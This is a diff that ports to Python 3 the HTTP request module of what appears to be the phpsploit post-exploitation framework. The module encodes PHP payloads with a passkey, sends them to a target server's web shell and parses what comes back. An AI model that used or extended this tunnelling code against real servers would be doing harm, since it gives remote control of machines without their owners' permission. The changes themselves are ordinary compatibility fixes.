@@ -4,6 +4,7 @@ import re
 import math
 import uuid
 import time
+import codecs
 import base64
 import urllib.request
 import urllib.parse
@@ -52,10 +53,10 @@ class Request:
 
     def __init__(self):
         # customizable variables
-        target = session.Conf.TARGET(call=False)
-        self.hostname = target.host
-        self.port = target.port
-        self.target = target()
+        self.target_obj = session.Conf.TARGET(call=False)
+        self.hostname = self.target_obj.host
+        self.port = self.target_obj.port
+        self.target = self.target_obj()
         self.passkey = session.Conf.PASSKEY()
         self.is_first_payload = False
         self.is_first_request = True
@@ -76,7 +77,7 @@ class Request:
         # the parser/unparser are used to truncate phpsploit
         # data from the received http response.
         self.parser = self.parser.replace('%SEP%', str(uuid.uuid4()))
-        self.unparser = re.compile(self.parser % '(.+?)', re.S)
+        self.unparser = re.compile((self.parser % '(.+?)').encode(), re.S)
 
         # try to get a tmpdir, which acts as recipient directory on payloads
         # sent via multiple requests, if no writeable tmpdir is known, the
@@ -160,6 +161,7 @@ class Request:
         """parse the http response and return the phpsploit data response"""
 
         response = response.read()
+
         try:
             return re.findall(self.unparser, response)[0]
         except:
@@ -177,9 +179,11 @@ class Request:
 
         ask_dir = ui.input.Expect(case_sensitive=False, append_choices=False)
         ask_dir.default = "/tmp"
+        ask_dir.skip_interrupt = False
         ask_dir.question = ("Writeable remote directory needed"
-                            " to send multipart payload [/tmp]")
+                            " to send multipart payload ['/tmp/'] ")
         confirm = ui.input.Expect(True)
+        confirm.skip_interrupt = False
         while not self.tmpdir:
             response = ask_dir()
             if confirm("Use '%s' as writeable directory ?" % response):
@@ -207,7 +211,8 @@ class Request:
         template = template.replace('%%PASSKEY%%', self.passkey)
 
         rawForwarder = template % decoder
-        b64Forwarder = base64.b64encode(rawForwarder)
+        # b64Forwarder = codecs.encode(rawForwarder.encode(), "base64").decode()
+        b64Forwarder = base64.b64encode(rawForwarder.encode()).decode()
         # here we delete the ending "=" from base64 payload
         # because if the string is not enquoted it will not be
         # evaluated. on iis6, apache2, php>=4.4 it dont seem
@@ -233,7 +238,7 @@ class Request:
            '"%s"' not in hdr_payload and \
            not b64Forwarder.isalnum():
             # create a visible sample of the effective b64 payload
-            oneThirdLen = float(len(forwarder / 3))
+            oneThirdLen = float(len(forwarder) / 3)
             oneThirdLen = int(round(oneThirdLen + 0.5))
             sampleSeparator = colorize("%Reset", "\n[*]", "%Cyan")
             lineList = [''] + split_len(forwarder, oneThirdLen)
@@ -343,7 +348,7 @@ class Request:
             it with the phpcode.payload.Encode() class.
 
             """
-            data = forwarder.replace('DATA', payload)
+            data = forwarder.replace('DATA', payload).encode()
             encodedPayload = tunnel.payload.Encode(data, compression)
             return encodedPayload
 
@@ -469,7 +474,10 @@ class Request:
 
         # treat errors if request failed
         except urllib.error.HTTPError as e:
-            response['data'] = self.decapsulate(e)
+            try:
+                response['data'] = self.decapsulate(e)
+            except:
+                response['data'] = None
             if response['data'] is None:
                 response['error'] = str(e)
         except urllib.error.URLError as e:
@@ -528,6 +536,12 @@ class Request:
         response may be obtained by the read() method.
 
         """
+
+        # if the is more than one possible target, display the one used for
+        # this request(s). Also print if connecting through `exploit` cmd
+        if self.is_first_payload or len(session.Conf.TARGET.choices()) > 1:
+            print("[*] Sending payload to %s ..." % self.target_obj)
+
         self.response = None
         self.response_error = None
 
@@ -567,7 +581,7 @@ class Request:
                              'than REQ_MAX_HEADER_SIZE')
 
         # format the current php payload whith the dedicated Build() method.
-        tunnel.payload.Build(payload, self.parser)
+        payload = tunnel.payload.Build(payload, self.parser)
 
         # get a dict of available modes by method
         mode = {}
@@ -757,9 +771,11 @@ class Request:
         response = response['data']
         # try to decode it, optional because php encoding can be unset
         try:
-            response = response.decode('zlib')
+            response = codecs.decode(response, 'zlib')
         except:
             pass
+
+        response = response.decode()
 
         # convert the response data into python variable
         try:
@@ -776,9 +792,9 @@ class Request:
             raise ResponseError('Decoded response is not a dict()')
         # then check it is in the good format,
         # aka {'__RESULT__':'DATA'} OR {'__ERROR__':'ERR'}
-        if response.keys() == ['__RESULT__']:
+        if list(response.keys()) == ['__RESULT__']:
             self.response = response['__RESULT__']
-        elif response.keys() == ['__ERROR__']:
+        elif list(response.keys()) == ['__ERROR__']:
             self.response_error = response['__ERROR__']
         else:
             raise ResponseError('Returned dict() is in a wrong format')
